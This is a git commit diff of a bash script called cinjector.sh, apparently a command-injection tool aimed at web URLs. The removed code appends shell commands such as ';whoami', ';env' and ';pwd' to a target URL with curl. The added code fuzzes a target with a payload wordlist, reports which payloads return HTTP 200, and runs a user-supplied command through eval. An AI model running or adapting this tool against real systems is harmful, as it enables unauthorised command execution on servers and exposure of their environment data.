fbc29fe91502b01be92a487bfce31264c6dea3ce
Neres7 <114869466+Neres7@users.noreply.github.com>
2023-04-13 22:09:37 -0300

    Update cinjector.sh

--- cinjector.sh
+++ cinjector.sh
@@ -1,49 +1,86 @@
 #!/bin/bash
-echo "
+#Author : Vitor Neres
+echo -e "\e[31m
+   _____   _____       _           _             
+  / ____| |_   _|     (_)         | |            
+ | |        | |  _ __  _  ___  ___| |_ ___  _ __ 
+ | |        | | | '_ \| |/ _ \/ __| __/ _ \| '__|
+ | |____   _| |_| | | | |  __/ (__| || (_) | |   
+  \_____| |_____|_| |_| |\___|\___|\__\___/|_|   
+                     _/ |                        
+                    |__/                         \e[0m"
 
+usage() {
+  echo "Usage: $0 -u URL [-w wordlist] [-c command]"
+  echo ""
+  echo "Options:"
+  echo "  -u  Target URL."
+  echo "  -w  Path to the wordlist file. Uses default [payloads.txt] if not especified"
+  echo "  -c  Command to execute after each payload is tested."
+  echo "  -h  Display this help message."
+  exit 1
+}
 
- .d8888b. 8888888           d8b                   888                    
-d88P  Y88b  888             Y8P                   888                    
-888    888  888                                   888                    
-888         888   88888b.  8888  .d88b.   .d8888b 888888 .d88b.  888d888 
-888         888   888  88b 888  d8P  Y8b d88P     888   d88  88b 888P   
-888    888  888   888  888  888 88888888 888      888   888  888 888     
-Y88b  d88P  888   888  888  888 Y8b.     Y88b.    Y88b. Y88..88P 888     
-  Y8888P  8888888 888  888  888   Y8888    Y8888P  Y888  Y88P  888     
-                            888                                          
-                           d88P                                          
-                         888P                                           
+while getopts "u:w:c:h" opt; do
+  case $opt in
+    u)
+      url=$OPTARG
+      ;;
+    w)
+      wordlist=$OPTARG
+      ;;
+    c)
+      command=$OPTARG
+      ;;
+    h)
+      usage
+      ;;
+    \?)
+      echo "Invalid option: -$OPTARG" >&2
+      usage
+      ;;
+    :)
+      echo "Option -$OPTARG requires an argument." >&2
+      usage
+      ;;
+  esac
+done
 
-
-
-"
-sleep 2s
-#read -p "Input the vulnerable URL: " URL
-if [[ $1 == "-h" ]] || [[ $1 == "--help" ]];then
-        echo "Usage"
-        echo "------------------------------"
-        echo "    -u url to attack"
-        echo "Commands"
-        echo "------------------------------"
-        echo "    -d date"
-        echo "    -w whoami"
-        echo "    -p pwd"
-        echo "    -e env"
-        echo "------------------------------"
-        echo "Example"
-        echo "./cinjector -u <url> -p"
-        echo "./cinjector -u <url> -w"
-        echo "------------------------------"
-
-elif [[ $1 == "-u" ]] && [[ $3 == "-d" ]];then
-        curl "$2;date"
-elif [[ $1 == "-u" ]] && [[ $3 == "-p" ]];then
-        curl "$2;pwd"
-elif [[ $1 == "-u" ]] && [[ $3 == "-w" ]];then
-        curl "$2;whoami"
-elif [[ $1 == "-u" ]] && [[ $3 == "-e" ]];then
-        curl "$2;env"
-else
-        echo "If you need help type -h or --help"
-        echo "Usage ./resolve.sh -u <url> -p"
+if [ -z "$url" ]; then
+  echo "The -u option is mandatory." >&2
+  usage
 fi
+
+if echo "$url" | grep -q "^https"; then
+  curl_cmd="curl -k"
+else
+  curl_cmd="curl"
+fi
+
+if [ -z "$wordlist" ]; then
+  wordlist="payloads.txt"
+fi
+
+if [ ! -f "$wordlist" ]; then
+  echo "Wordlist not found: $wordlist" >&2
+  exit 1
+fi
+
+command_index=0
+while read -r payload; do
+  ((command_index++))
+  if echo "$url" | grep -q "^https"; then
+    $curl_cmd "${url}${payload}" -s -o /dev/null -w "%{http_code}\n" 2>&1 | grep -q "200"
+  else
+    $curl_cmd -s -o /dev/null -w "%{http_code}\n" "${url}${payload}" | grep -q "200"
+  fi
+  if [ $? -eq 0 ]; then
+    sleep 1s
+    echo "URL found: ${url}${payload}"
+    echo -e "Successful payload: \033[1;31m${payload}\033[0m"
+                echo -e "\e[32m[+] Payload worked: $payload\e[0m"
+    if [ -n "$command" ]; then
+      eval "$command"
+    fi
+  fi
+done < "$wordlist"
